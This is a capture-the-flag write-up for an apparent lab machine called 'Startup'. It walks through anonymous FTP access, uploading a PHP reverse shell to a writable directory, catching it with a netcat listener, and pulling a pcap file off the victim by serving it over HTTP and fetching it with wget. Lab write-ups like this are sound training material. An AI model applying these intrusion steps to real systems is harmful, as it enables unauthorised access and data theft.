![[startup2.png]]

## Anonymous FTP login

1. Since FTP is open, we may be able to connect anonymously. Let’s try this using the following command:
```python
ftp anonymous@10.10.206.211
```
When prompted for a password, we simply press enter and see if we get access.
![[startup4.png]]
There are three files and one directory. The ftp directory has full permissions which may play a role later.

2. Now, let’s download the files using the following command:
```python
get <filename>
```
![[startup5.png]]

3. The notice.txt message has a message about people putting memes in the share. They mention the name Maya which may be a potential username later.
![[startup6.png]]
The important.jpg image contains one of the memes that is being talked about.
I ran the image through [Aperi’Solve](https://www.aperisolve.com/) to look for anything in the image but nothing immediately stood out.

4. Let’s change to the ftp directory and see if anything is inside.
![[startup9.png]]

5. Uploading php-shell in the "ftp" directory.
![[startup10.png]]

6. Start the netcat listener using below command:
```python
nc -lvnp 4444
```

Now, execute the script that was upload in the "ftp" directory.
![[startup11.png]]
first flag --> love

7. Downloading the "suspicious" file in the local machine.
**In victim** --> 
```python
python3 -m http.server 8080
```
Execute the above command where there is this "suspicious" named file reside.

**In attacker** -->
```python
wget http://10.10.206.211:8080/suspicious.pcapng
```

